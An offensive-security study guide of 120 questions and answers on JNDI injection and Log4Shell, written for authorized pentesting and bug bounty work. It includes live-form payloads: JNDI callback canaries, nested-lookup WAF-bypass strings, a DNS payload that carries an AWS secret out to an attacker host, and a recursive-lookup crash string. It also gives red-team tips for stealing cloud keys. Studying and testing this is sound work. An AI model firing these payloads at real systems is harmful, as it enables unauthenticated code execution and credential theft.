# JNDI Injection / Log4Shell — Zero to Expert (120 Q&A)

**Author:** x8bitranjit
Study guide + field reference. Impact-first: the finding is a **target-sourced OOB callback carrying your unique token**
(blind unauth RCE). Pair with `JNDI_TESTING_GUIDE.md`. Authorized targets only; your own OOB, benign proof, then STOP.

---

## A. Fundamentals (1–15)

**1. What is JNDI?**
Java Naming and Directory Interface — an API that resolves a **name** into a **Java object** via a backend (LDAP, RMI, DNS, IIOP, CORBA).

> *Plain version:* JNDI is Java's directory-assistance — "look up this name, connect me to whatever it points to." The bug is that *you* supply the name, so you point Java at *your own* server, which hands back a booby-trapped object Java then builds and runs = code execution.

**2. What is JNDI injection, in one sentence?**
When an attacker controls the name passed to a JNDI lookup, they point the JVM at **their own** LDAP/RMI server, which returns a **malicious object** the JVM instantiates/deserializes → **RCE**.

> *Plain version:* Log4j — a logging library in nearly every Java app — would perform that dangerous lookup on *anything it wrote to a log file.* So an attacker didn't need to reach the lookup directly; they just had to get their `${jndi:…}` string **logged** (a User-Agent, a username, a 404 path). Logging is everywhere and runs before login, so overnight every logged input became unauthenticated RCE.

**3. What made Log4Shell so catastrophic?**
Log4j's **message lookup** evaluated `${jndi:…}` inside *anything it logged* — so any attacker-influenced, logged string (a `User-Agent`, a username) became **unauthenticated RCE**, with a huge unexpected surface.

**4. The CVE number for Log4Shell?**
CVE-2021-44228 (CVSS 10.0).

**5. Walk the exploitation chain.**
Attacker supplies `${jndi:ldap://attacker/x}` → victim JVM does `lookup("ldap://attacker/x")` → attacker LDAP returns a Reference/serialized object → JVM fetches/instantiates/deserializes it → attacker code runs.

> *Plain version:* to *look up* `ldap://something/`, Java first has to translate `something` into an IP — a DNS query. That query hits your listener before any real connection happens. So a DNS ping carrying your unique tag proves the server evaluated your payload — a complete, blind proof of the bug without ever running a command or seeing the response.

**6. Why is a DNS callback enough to "confirm" it?**
Log4j resolves the host **before** connecting; a DNS lookup from the target's egress carrying your token proves the `${jndi:}` was evaluated by a live sink — the blind-RCE proof, even with no shell.

**7. What's the difference between the Log4Shell instance and the JNDI-injection class?**
JNDI injection = any `Context.lookup(attackerInput)`. Log4Shell = the mass-exploited case where **Log4j's logging** performs that lookup for you.

**8. Which JVM backends can JNDI use for the lookup?**
LDAP, RMI, DNS, IIOP/CORBA, NIS, NDS. LDAP and RMI reach RCE; DNS is detection/exfil.

**9. Why is this "unauthenticated, pre-auth" so often?**
Because the trigger is *logging*, not a privileged action — failed logins, 404 paths, rejected headers all get logged before auth.

**10. Primary CWE for Log4Shell?**
CWE-917 (Expression Language Injection) — the `${…}` lookup — plus CWE-502 (deserialization) for the gadget path and CWE-74 (injection).

**11. Does modern JDK fully fix it?**
No. Modern JDK blocks the **remote-codebase** technique (`trustURLCodebase=false`), but the **serialized-gadget** and **BeanFactory/EL** techniques still achieve RCE.

> *Plain version:* no — 2.15 stopped the *code-execution* part but still *resolves* lookups. Hide a secret-reading lookup inside the hostname (`${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.your-oob/}`) and the secret walks out as a DNS label. Cloud keys stolen, no code run. "We're on 2.15" is not "we're safe."

**12. Does patching Log4j to 2.15 make you safe?**
Not fully — 2.15 stopped remote RCE but **still did lookups**, so `${env:SECRET}` **exfil over DNS** works, and CVE-2021-45046 reintroduced RCE via a bypass.

**13. What version fully removed message lookups?**
Log4j 2.16.0 (lookups removed); 2.17.0 fixed the recursion DoS; 2.17.1 fixed the JDBCAppender RCE.

**14. Why does DNS exfil matter operationally?**
DNS egress is usually open even when HTTP/LDAP egress is filtered — so you can leak secrets/confirm the sink where nothing else escapes.

**15. One-line mental model?**
Find any input that reaches a JNDI lookup (directly or via a Log4j message/EL/config), make the JVM resolve **your** URL, and a token-carrying callback = the bug.

---

## B. The vulnerable surface (16–27)

**16. Which Log4j versions are RCE-vulnerable to `${jndi:}`?**
`log4j-core` 2.0-beta9 through 2.14.1.

**17. What about log4j 1.x?**
EOL and different: JMSAppender JNDI (CVE-2021-4104) and SocketServer deserialization (CVE-2019-17571) — both need config/listener preconditions.

**18. Name non-Log4j products with a JNDI sink.**
H2 database console (CVE-2021-42392), Logback config (CVE-2021-42550), Solr, Druid, Struts, OFBiz, Spring (Cloud Function SpEL), and any app doing `InitialContext.lookup(userInput)`.

**19. Why is the H2 console a great find?**
Its JDBC URL / console can trigger JNDI → RCE, and it's common in dev/CI/admin surfaces.

**20. What's the generic (non-CVE) JNDI sink pattern?**
`ctx.lookup(userControlledString)` in JMS, RMI registries, LDAP "provider URL" auth, or custom naming code.

**21. What products were mass-exploited via bundled Log4j?**
VMware Horizon/vCenter, Ubiquiti/UniFi, MobileIron, Cisco/VMware appliances, countless Java apps — Log4j is a transitive dependency everywhere.

**22. Why are appliances especially exploitable?**
They often run **old embedded JVMs** where `trustURLCodebase=true` still allows the easy **remote-codebase** technique.

**23. Where does the payload have to land to fire?**
Anywhere the app **logs** or **looks up** — which is a much larger surface than "reflected in the response."

**24. Can a value stored now fire later?**
Yes — second-order: a value logged later by a back-office worker/admin panel triggers the lookup in a higher-priv context.

**25. Does the input need to appear in the HTTP response?**
No. This is blind by nature — you confirm via OOB, not reflection.

**26. What is CVE-2021-44832?**
An RCE where an attacker with **config-write** sets a JDBCAppender JNDI datasource → RCE. Fixed in 2.17.1.

**27. What's Spring4Shell and is it JNDI?**
No — Spring4Shell (CVE-2022-22965) is **SpEL/data-binding class-loader** RCE. Don't conflate it with JNDI/Log4Shell.

---

## C. Detection (28–40)

**28. First operational step?**
Stand up an OOB host (interactsh/Burp Collaborator) that captures DNS and LDAP/RMI connections.

**29. The baseline canary?**
`${jndi:ldap://<token>.<your-oob>/a}` — and the DNS-only variant `${jndi:dns://<token>.<your-oob>/a}`.

**30. Why a per-input token?**
So a callback's subdomain tells you **exactly** which input is vulnerable (and correlates to your request). `jndi_probe.py` automates this.

**31. Which inputs do you spray?**
Every header (User-Agent, X-Forwarded-For, Referer, X-Api-Version, Authorization, custom `X-*`), every param/JSON value+key, username/email, filename, and the path.

**32. Why is `dns://` the best first probe?**
It's the stealthiest and most egress-friendly — it confirms the sink even where LDAP/RMI egress is blocked.

**33. What's the difference between a DNS-only hit and a DNS+LDAP hit?**
DNS-only = the sink is live but LDAP egress is filtered (still Critical, pivot to `${env}` exfil). DNS+LDAP connect = the full RCE path is open.

**34. How do you avoid a false positive from your own resolver?**
Confirm the callback comes from the **target's egress IP**, correlated to your unique token — not your machine/CDN/proxy.

**35. What if an AV/scanner sandbox detonates your payload?**
Security products sometimes fetch the URL; correlate source ASN + timing and re-fire with a fresh token to confirm it's the app path.

**36. Why is reflection of `${jndi:}` in the response NOT a finding?**
Reflection ≠ evaluation. Only an OOB callback proves the lookup actually fired.

**37. What tool sprays canaries automatically?**
`log4j-scan` (fullhunt), nuclei `-tags log4j`, and `poc/jndi_probe.py` (per-input tokens).

**38. How do you fingerprint the JVM/OS blindly?**
`${jndi:dns://ver-${sys:java.version}.<oob>/a}` — the resolved version arrives as a DNS label.

**39. What confirms the sink is Log4j specifically vs generic JNDI?**
Log4j resolves the nested `${…}` lookups (e.g. `${sys:java.version}` returns a value); a generic `Context.lookup()` sink won't resolve those sub-lookups.

**40. Can you detect it without any OOB service?**
Yes — point `${jndi:ldap://YOUR-IP:1389/}` at `poc/callback_listener.py`; a logged TCP connection is the callback (it serves no gadget).

---

## D. WAF / filter bypass (41–48)

> *Plain version:* a WAF blocking `${jndi:` is matching the *word*, so you never spell it. Log4j resolves inner pieces first — `${lower:j}`→`j` — and reassembles `jndi` at runtime, after the filter already passed it. You spell the banned word out of Lego bricks the filter doesn't recognise.

**41. Why can you obfuscate `jndi`?**
Log4j evaluates **nested** `${…}` lookups, so you rebuild the word at runtime and no static signature matches.

**42. Give the `${lower:}` bypass.**
`${${lower:j}ndi:ldap://…}` (or `${${lower:jndi}:ldap://…}`).

**43. Give the default-value (`${::-}`) bypass.**
`${${::-j}${::-n}${::-d}${::-i}:ldap://…}` — `${::-X}` resolves to literal `X`.

**44. Rebuild the protocol too?**
`${jndi:${lower:l}${lower:d}a${lower:p}://…}` reconstructs `ldap`.

**45. Use an env default to inject a letter?**
`${${env:NOTSET:-j}ndi:…}` — an unset env var falls back to `j`.

**46. What if even nested lookups are stripped?**
Try a **different logged input** (WAFs rarely inspect every header) or switch to `dns://`.

**47. Can you split a payload across inputs?**
Yes, if the app concatenates them (e.g. two headers logged together).

**48. Does URL-encoding help?**
Sometimes — encode the whole value or key characters to slip a regex, then the app decodes before logging.

---

## E. Exploitation techniques & JVM matrix (49–66)

> *Plain version:* the callback proved Java phoned your server; now the server must hand back something that *runs.* (A) "download and run this class" — only old JVMs still trust it. (B) hand back a booby-trapped serialized object that detonates a gadget already on the target. (C) build the exploit from classes *already installed* (Tomcat's BeanFactory) so nothing's downloaded or deserialized — the modern-JVM bypass.

**49. Name the three RCE delivery techniques.**
(A) Remote codebase, (B) Serialized gadget, (C) Local factory / BeanFactory-EL.

**50. Technique A — how it works and when.**
The LDAP referral gives `javaCodeBase`+`javaFactory`; the JVM downloads the class over HTTP and runs it. Works only when `trustURLCodebase=true` (JDK before Oct-2018).

**51. Technique B — how it bypasses the codebase mitigation.**
The LDAP entry carries `javaSerializedData`; the JVM **deserializes** it; a classpath gadget (Commons-Collections, Spring…) runs — no remote class fetch, so `trustURLCodebase=false` doesn't stop it.

**52. Technique C — why it's the important modern one.**
It uses only classes **already on the target** (Tomcat `BeanFactory` + an EL-evaluating bean), so it needs no remote/serialized class and works on patched JVMs with Tomcat/Groovy on the classpath.

**53. What flips `trustURLCodebase` to false by default?**
JDK 6u211 / 7u201 / 8u191 / 11.0.1 (October 2018).

**54. How do you pick a technique?**
Old JDK → A (fastest). Modern JDK → C (BeanFactory/EL) first, then B (serialized gadget) if a classpath gadget exists.

**55. What tools deliver these payloads?**
marshalsec (LDAP/RMI referral) + ysoserial (gadget), and all-in-one servers JNDI-Injection-Exploit / rogue-jndi / JNDIExploit (auto-select A/B/C).

**56. Does this kit ship an exploit server?**
No — deliberately. It ships **detection** (`poc/`); RCE delivery uses the established tools on authorized engagements.

**57. What's the relationship to insecure deserialization?**
Technique B **is** deserialization — the JNDI lookup is just the trigger; the RCE comes from a ysoserial gadget (cross-ref the Deserialization kit).

**58. How do you read the JDK version to choose?**
`${jndi:dns://ver-${sys:java.version}.<oob>/a}`, an error/banner, or a stack trace.

**59. Why note the technique in your report?**
So a triager doesn't wrongly close a modern-JDK target as "mitigated" — B/C still achieve RCE.

**60. What's the minimum to prove RCE safely?**
One benign command (`id`/`hostname`/a unique echo) or a single `${env}` leak — then STOP.

**61. Why do old appliances make technique A viable?**
They run old embedded JVMs where remote-codebase loading is still trusted.

**62. What classpath gadgets are common for B?**
Commons-Collections 3.1/4.0, Spring, Groovy, and others — see the Deserialization kit's ysoserial matrix.

**63. Does HTTPS on the target change anything?**
No — the outbound JNDI/LDAP connection is what matters, not the inbound TLS.

**64. Can you get RCE with only `dns://`?**
No — DNS is detection/exfil only; RCE needs LDAP/RMI object delivery.

**65. What is `forceString` in the BeanFactory trick?**
An LDAP Reference attribute that coerces a bean setter to evaluate an EL/command string using classpath classes → RCE without remote code.

**66. Why is Tomcat's presence significant?**
`org.apache.naming.factory.BeanFactory` ships with Tomcat, enabling technique C on the extremely common Tomcat stacks.

---

## F. Secret exfil, SSRF & DoS (67–74)

**67. How do you exfil secrets without RCE?**
Nest a lookup inside the JNDI host: `${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.<oob>/a}` — the secret becomes a DNS label sent to your OOB.

**68. Which lookups resolve values for exfil?**
`${env:…}`, `${sys:…}`, `${main:…}`, `${docker:…}`, `${k8s:…}`.

**69. Why does exfil work on Log4j 2.15?**
2.15 stopped remote RCE but **still performed lookups**, so `${env}` resolution (and the DNS leak) still fires.

**70. How do you handle DNS-invalid characters in a secret?**
base32/hex-encode the value and/or split it across multiple labels.

**71. What's the SSRF angle?**
The JNDI/LDAP/DNS lookup is an attacker-controlled outbound request → hit internal services or cloud metadata (`169.254.169.254`) → chain to the SSRF kit.

**72. What's the DoS variant?**
CVE-2021-45105 — a self-referential recursive lookup (`${${::-${::-$${::-:}}}}`) causes infinite recursion → StackOverflow → crash.

**73. Severity of secret-exfil-only?**
High → Critical depending on the secret (AWS/DB creds in the DNS query = real data theft), even with no code execution.

**74. What must you do with exfil'd secrets?**
Take only the minimum to prove it, redact in the report, and recommend rotation.

---

## G. Distinguishing from other classes (75–81)

**75. JNDI injection vs LDAP injection?**
LDAP injection tampers an LDAP **query filter** (auth bypass/data). JNDI injection makes the JVM **connect to an attacker LDAP server** for a malicious object (RCE). Same protocol name, different bug.

**76. JNDI vs insecure deserialization?**
JNDI is often the **trigger**; technique B reaches RCE via the same deserialization gadgets. Deserialization can also happen with no JNDI.

**77. JNDI vs SSRF?**
A JNDI lookup is an SSRF primitive, but the ceiling here is **RCE**, not just internal fetch.

**78. JNDI vs SpEL/OGNL/SSTI?**
EL injection can **reach** a JNDI lookup (e.g. Spring), but EL injection is its own sink class; Log4j's `${}` is EL-like (CWE-917) resolving via JNDI.

**79. JNDI vs Spring4Shell?**
Spring4Shell is SpEL/data-binding class-loader RCE — not JNDI. Different root cause.

**80. Which kits does this one cross-reference?**
Deserialization (gadget path), SSRF (lookup as SSRF), LDAP (the contrast), and the exploit tooling.

**81. Why does this kit "own" the distinction note?**
Because the LDAP/Deserialization/CommandInjection kits all say "distinguished from Log4Shell/JNDI" — this kit is where that boundary is defined (§15).

---

## H. Validity, false positives & severity (82–92)

**82. The golden proof for a JNDI finding?**
A target-egress OOB callback (DNS/LDAP) carrying your unique token — ideally escalated to one benign command or one leaked secret.

**83. Top false positive?**
A reflected `${jndi:}` in the response with **no** callback (reflection ≠ evaluation).

**84. Second false positive?**
A scanner/version-banner "log4j detected" with **no** OOB callback from the target.

**85. Third false positive?**
A DNS hit from **your** resolver/CDN/proxy, not the target's egress.

**86. Fourth false positive?**
A callback from a security **sandbox** detonating the payload rather than the app path.

**87. When is `${env}` exfil a false positive?**
When the arriving label is **empty** (the env var isn't set) — you need a non-empty secret.

**88. CVSS anchor for unauth RCE?**
`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` = 10.0.

**89. Severity of a confirmed blind callback (no shell dropped)?**
Critical — the callback proves the sink; you don't need to run a command to earn it.

**90. Severity of an H2/JDBC/Logback JNDI needing a precondition?**
High → Critical depending on the precondition (console access / config write).

**91. What downgrades a finding to Informational?**
Reflection-only, scanner-banner-only, or a callback you can't attribute to the target.

**92. Why re-test partial fixes?**
`formatMsgNoLookups` mitigates but isn't a full fix; a sink reachable via a different input, or a 2.15→exfil path, is a fresh valid finding.

---

## I. SAFE-PoC, reporting & red-team (93–100)

**93. The one rule that keeps you safe?**
A benign OOB callback is already Critical — confirm it (optionally one benign command / one leaked secret) and stop. You never need a shell to prove Log4Shell.

**94. What must NOT go on a bug-bounty target?**
Reverse shells, persistence, beacons, mass secret exfil, or a DoS without authorization.

**95. What does a JNDI report need?**
The vulnerable input + endpoint, the payload, your OOB host, and the **token-correlated callback log** (target egress IP), plus the RCE technique available.

**96. How do you de-duplicate?**
One **sink** = one report even across many headers/params; list the inputs and lead with the confirmed one. Exfil-only and full-RCE on the same sink = one report.

**97. Remediation to recommend?**
Upgrade Log4j to 2.17.1+, or remove `JndiLookup.class`; set `trustURLCodebase=false`; egress-filter outbound LDAP/RMI/DNS; never pass user input to `Context.lookup()`; patch product CVEs; rotate exposed secrets.

**98. Best red-team play on "patched" 2.15 hosts?**
`${env}` secret exfil over DNS — cloud keys without ever running code, and quiet.

**99. Best red-team play on old appliances?**
Technique A remote-codebase for a fast shell (old embedded JVMs trust codebases).

**100. Final checklist before submitting?**
Target-sourced callback with my token? Correct input identified? Own OOB + per-input token used? Benign only, exploit server torn down? Technique + version noted? Remediation given? All yes → it's the Critical it's worth.

---

## J. Interview questions (101–112)

> *Bank of the questions a senior/interviewer actually asks — say the crisp version out loud.*

**101. Explain Log4Shell to a non-Java engineer in three sentences.**
Java has a feature that means "look up this name and give me back the object it points to." Log4j — a logging library in nearly every Java app — would run that lookup on any text it wrote to a log, including attacker-controlled text like a browser's User-Agent. So an attacker just had to get their string logged, and the server would fetch and run attacker code — unauthenticated, before login.

**102. Why is a JNDI/Log4Shell bug "blind," and why is a blind proof still Critical?**
The vulnerable input rarely appears in the HTTP response, so you can't see the result inline — you confirm out-of-band. It's still Critical because a **DNS/LDAP callback from the target's egress carrying your unique token** proves the string was evaluated by a live JNDI sink; that same primitive is unauthenticated RCE on a reachable JVM, so the callback *is* the proof of the ceiling.

**103. A candidate says "we upgraded to 2.15, we're safe." What's your response?**
Not necessarily. 2.15 restricted message lookups to localhost but still **performed lookups**, and CVE-2021-45046 showed that attacker input reaching a non-message pattern element (the Thread Context Map / MDC) bypasses the localhost restriction — RCE in some configs, and `${env}` secret exfil over DNS in all of them. Only 2.16 (lookups removed) actually closes it; `formatMsgNoLookups` was declared insufficient.

**104. Does a modern JDK (post-Oct-2018) mitigate the RCE?**
No — it only changes the technique. `trustURLCodebase=false` (6u211/7u201/8u191/11.0.1) kills the *remote-codebase* path (A), but the *serialized-gadget* path (B, if a classpath gadget exists) and the *BeanFactory/EL local-factory* path (C, if Tomcat is on the classpath) still reach RCE. I always note the technique in the report so it isn't wrongly closed as "mitigated by JDK version."

**105. What's the single fact that most changes your exploitation plan?**
Whether **lookups still resolve but object-delivery egress is closed.** If DNS canaries return but LDAP never connects back, I stop chasing a shell and pivot to `${env}`/`${sys}` **secret exfil over DNS** — the thing this class can do that a plain deserialization bug can't. It turns a "patched" host into stolen cloud credentials.

**106. How do you distinguish JNDI injection from LDAP injection in one line?**
LDAP injection tampers an LDAP **query filter** to bypass auth or read the directory; JNDI injection makes the JVM **connect to an attacker's LDAP server** to fetch a malicious object for RCE. Same protocol name, completely different bug and ceiling.

**107. Why is the attack surface for Log4Shell so much larger than a typical injection?**
Because the trigger is **logging**, not a processing path. Anything the app writes down — a failed-login username, a 404'd URL, a rejected header, a value a back-office worker logs later — is a candidate, including headers nobody validates. That's why you spray a per-input canary into *everything* and let the callback name the vulnerable input.

**108. Someone hands you a scanner report saying "Log4j detected." Is that a finding?**
No — that's a lead. A version banner or a reflected `${jndi:}` proves nothing. A finding is a **target-egress OOB callback correlated to my own per-input token**. I reproduce with my own interactsh/Collaborator before I ever write it up.

**109. Walk me through why the same one primitive yields either RCE or credential theft.**
The primitive is "make the JVM resolve my URL." What comes back — or whether anything comes back — depends on the JVM's patch state and egress. Reachable object delivery → the LDAP server returns a Reference/serialized object → RCE (A/B/C). Egress/version closes object delivery but lookups still fire → nest `${env:SECRET}` inside the hostname → the secret leaves as a DNS label. One cause, two cash-outs.

**110. What's your remediation advice, in priority order?**
Upgrade Log4j to **2.17.1+** (or the Java-7 2.12.4 line); if you can't upgrade, **remove `JndiLookup.class`** from the jar. Then defence-in-depth: `trustURLCodebase=false` (default on modern JVMs), **egress-filter outbound LDAP/RMI/DNS** from app servers, never pass user input to `Context.lookup()` (allow-list the name), rotate any secrets that could have been exfiltrated, and patch product-specific JNDI CVEs (H2/Logback/Spring).

**111. Why can DNS-based exfil succeed where everything else is blocked?**
DNS egress is almost always left open (the app has to resolve names to function), and it resolves *recursively* out through the org's resolvers — so even when HTTP and LDAP egress are firewalled, a `${jndi:dns://…}` lookup with a secret nested in the label still leaves the network. It's also the quietest channel.

**112. What separates a good Log4Shell report from a noisy one?**
A good one names the **exact input** (which header/param), shows the **token-correlated callback log from the target's egress IP**, states the **JVM/Log4j version + the available technique**, and — where it applies — includes one benign proof (an `id` or a single redacted `${env}` label). A noisy one pastes a scanner banner or a reflected string and claims "Critical RCE" with no callback.

---

## K. Scenario-based questions (113–120)

> *Realistic field situations — decide the next move and the severity.*

**113. Scenario: You inject `${jndi:dns://tok.oob/a}` into `User-Agent` and get a DNS hit from the target's IP, but the `ldap://` variant produces DNS with no LDAP connect-back. What do you conclude and do next?**
The sink is live and lookups resolve, but object-delivery egress to LDAP is closed (firewall) or it's a 2.15-class host restricting message lookups to localhost. RCE via A/B/C is off this path. **Pivot to `${env}`/`${sys}` secret exfil over DNS** (§11) and blindly fingerprint the version (`${sys:java.version}`). Severity: already **Critical** for the confirmed sink; if a non-empty secret label arrives, report it as High→Critical data theft with the exact creds redacted.

**114. Scenario: A DNS callback for your token arrives, but from a cloud provider's resolver ASN, not the target's egress range, and ≈30s after your request. Real or noise?**
Suspicious — that pattern fits an **AV/scanner sandbox** detonating the payload rather than the app path. Don't report it yet. Re-fire with a fresh unique token, correlate the **source IP/ASN and timing** to the app's known egress, and only count it if the callback demonstrably originates from the target's own infrastructure on the request path.

**115. Scenario: The WAF blocks any request containing the literal `${jndi:`, returning 403. The app is Java. Next steps?**
The block is a **spelling filter, not a wall.** Rebuild the word from nested lookups Log4j reassembles at runtime: `${${lower:j}ndi:…}`, `${${::-j}${::-n}${::-d}${::-i}:…}`, and rebuild the protocol too (`${lower:l}${lower:d}a${lower:p}`). If those are stripped as well, try a **different logged input** (WAFs rarely inspect every header) or switch to `dns://`. Confirm via OOB, not the 403/200 status.

**116. Scenario: `${sys:java.version}` exfil returns `1.8.0_312`. How does that change your plan?**
8u312 is post-Oct-2018, so `trustURLCodebase=false` — **skip technique A** (remote codebase is dead). If object delivery egress is open, try **C (BeanFactory/EL)** first (Tomcat is nearly ubiquitous) then **B (classpath serialized gadget)**. If egress is closed, it's the exfil scenario (§11). Note the JDK + technique in the report so it isn't closed as "modern JDK, safe."

**117. Scenario: You confirm the callback and it's an authorized pentest with a shell mandate. The JVM is old (8u102) and Tomcat is present. What's the fastest clean proof?**
Old JVM → `trustURLCodebase=true` → **technique A (remote codebase)** is the quickest: stand up marshalsec's LDAPRefServer pointing at your HTTP-hosted `Exploit.class`, run **one benign command** (`id` / `hostname` / a unique echo), capture the output, then **tear the server down**. No reverse shell, no persistence — one benign command is the RCE proof.

**118. Scenario: The vulnerable field is a support-ticket "subject" that isn't logged by the front-end app but is rendered in an internal admin console. No callback fires on submission. Is it dead?**
Not necessarily — this is a **second-order / stored** case. The lookup may fire **later**, when a back-office worker or admin panel logs/renders the stored value, often in a higher-privilege context. Submit the tagged payload, then watch your OOB over a longer window (minutes to hours) for a delayed callback from an internal egress. A delayed hit is still a valid, often higher-impact finding.

**119. Scenario: You find an exposed **H2 database console** in a staging environment. How does the JNDI angle apply and what's the severity?**
H2's JDBC URL / console can trigger a JNDI lookup (CVE-2021-42392) → RCE, independent of Log4j. Point the datasource/`INIT` at your JNDI URL and confirm via OOB, then (authorized) one benign command. Severity **High→Critical by precondition** (console reachability). Even in staging it's a real finding if it holds prod-like data or pivots into the network — report it as its own JNDI sink, not folded into a Log4j report.

**120. Scenario: On a bug-bounty target you've confirmed a blind callback and exfiltrated one AWS key over DNS. The program allows "demonstrating impact." How far do you go?**
Stop at the **minimum** that proves it. Validate the creds are live with a single **read-only** call from your own box (`aws sts get-caller-identity`) — never enumerate S3, assume roles, or run anything on the target. Report the confirmed sink, the token-correlated callback, and the redacted key + the `get-caller-identity` ARN as proof of live prod credentials, and recommend immediate rotation. One benign proof each for detection and impact, then STOP.

---

> **The one rule that pays:** JNDI/Log4Shell is confirmed when the **target's own infrastructure calls back to your OOB host carrying your unique token** — that blind callback is already **Critical unauthenticated RCE** (or, on a partly-patched host, `${env}` secret theft over DNS). Prove *that*, optionally one benign command, and stop.
